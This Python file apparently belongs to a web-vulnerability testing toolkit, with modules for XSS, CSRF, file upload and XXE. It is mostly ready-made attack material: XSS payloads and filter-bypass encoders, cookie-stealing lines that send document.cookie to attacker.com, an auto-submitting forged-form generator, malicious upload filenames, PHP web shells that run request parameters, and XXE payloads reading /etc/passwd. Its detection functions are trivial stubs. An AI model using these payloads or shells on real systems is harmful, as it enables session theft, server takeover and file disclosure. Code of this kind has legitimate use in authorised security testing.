from typing import List, Dict


class XSSModule:
    def __init__(self):
        self.name = "Cross-Site Scripting"
        self.description = "XSS 취약점 테스트"
    
    def generate_payloads(self) -> List[str]:
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<iframe src=\"javascript:alert('XSS')\"></iframe>",
            "<input autofocus onfocus=alert('XSS')>",
            "<marquee onstart=alert('XSS')></marquee>",
            "';alert('XSS');//",
            "\"><script>alert('XSS')</script>",
            "<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">",
            "<div style=\"background:url(javascript:alert('XSS'))\"></div>",
            "<object data=\"data:text/html,<script>alert('XSS')</script>\"></object>",
        ]
    
    def generate_advanced_payloads(self) -> Dict[str, List[str]]:
        return {
            "dom": [
                "document.location='http://attacker.com/steal?c='+document.cookie",
                "fetch('http://attacker.com/log?data='+btoa(document.cookie))",
                "new Image().src='http://attacker.com/log?c='+document.cookie",
            ],
            "event_handlers": [
                "onload", "onerror", "onmouseover", "onmouseout", "onfocus", "onblur",
                "onchange", "onclick", "ondblclick", "onkeydown", "onkeyup", "onsubmit"
            ],
            "encoding": [
                "&#60;script&#62;",
                "\\x3cscript\\x3e",
                "\\u003cscript\\u003e",
                "%3Cscript%3E",
            ]
        }
    
    def test_xss_point(self, url: str, params: Dict[str, str]) -> List[str]:
        vulnerable = []
        for param, value in params.items():
            test_value = f"<script>test</script>{value}"
            if self._check_reflection(test_value):
                vulnerable.append(param)
        return vulnerable
    
    def _check_reflection(self, value: str) -> bool:
        return "<script>" in value
    
    def filter_bypass(self, payload: str, filter_type: str = "basic") -> str:
        bypass_techniques = {
            "basic": lambda x: x.replace("<", "<").replace(">", ">"),
            "tag_mangle": lambda x: x.replace("script", "sCrIpT"),
            "unicode": lambda x: "".join(f"\\u{ord(c):04x}" for c in x),
            "html_encode": lambda x: "".join(f"&#{ord(c)};" for c in x),
        }
        return bypass_techniques.get(filter_type, bypass_techniques["basic"])(payload)


class CSRFModule:
    def __init__(self):
        self.name = "Cross-Site Request Forgery"
        self.description = "CSRF 취약점 테스트"
    
    def generate_csrf_html(self, target_url: str, method: str = "POST", params: Dict = None) -> str:
        if params is None:
            params = {}
        
        form_fields = "\n".join(
            f'<input type="hidden" name="{k}" value="{v}">'
            for k, v in params.items()
        )
        
        return f'''
<html>
<body onload="document.forms[0].submit()">
<form action="{target_url}" method="{method}">
{form_fields}
</form>
</body>
</html>
        '''
    
    def check_csrf_protection(self, response_headers: Dict) -> Dict[str, bool]:
        return {
            "has_samesite": "Set-Cookie" in response_headers and "SameSite" in response_headers.get("Set-Cookie", ""),
            "has_csrf_token": "csrf-token" in response_headers or "x-csrf-token" in response_headers,
            "has_origin_check": "Origin" in response_headers,
        }
    
    def test_token_validation(self, token: str) -> bool:
        import re
        return len(token) > 20 and bool(re.match(r'^[a-zA-Z0-9\-_]+$', token))


class FileUploadModule:
    def __init__(self):
        self.name = "File Upload Vulnerability"
        self.description = "파일 업로드 취약점 테스트"
    
    def generate_malicious_filenames(self) -> List[str]:
        return [
            "shell.php",
            "shell.php.jpg",
            "shell.jpg.php",
            "shell.php%00.jpg",
            "shell.phtml",
            "shell.php3",
            "shell.php4",
            "shell.php5",
            "shell.shtml",
            "shell.jsp",
            "shell.jspx",
            "shell.war",
            "shell.asp",
            "shell.aspx",
            "shell.cgi",
            "shell.exe",
            "shell.sh",
            ".htaccess",
            "..\\..\\..\\shell.php",
        ]
    
    def generate_php_shells(self) -> List[str]:
        return [
            "<?php system($_GET['cmd']); ?>",
            "<?php exec($_POST['cmd']); ?>",
            "<?php passthru($_REQUEST['cmd']); ?>",
            "<?php eval($_POST['code']); ?>",
            "<?php include($_GET['file']); ?>",
        ]
    
    def check_file_restrictions(self, filename: str, allowed_extensions: List[str]) -> bool:
        return any(filename.lower().endswith(ext) for ext in allowed_extensions)
    
    def mime_type_bypass(self, original_mime: str) -> List[str]:
        return [
            "image/jpeg",
            "image/png",
            "image/gif",
            "image/svg+xml",
            "application/octet-stream",
            "text/plain",
        ]


class XXEModule:
    def __init__(self):
        self.name = "XML External Entity"
        self.description = "XXE 취약점 테스트"
    
    def generate_payloads(self) -> List[str]:
        return [
            '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>''',
            '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<data>&xxe;</data>''',
        ]
    
    def detect_xxe(self, response: str) -> bool:
        return "root:" in response or "bin:" in response
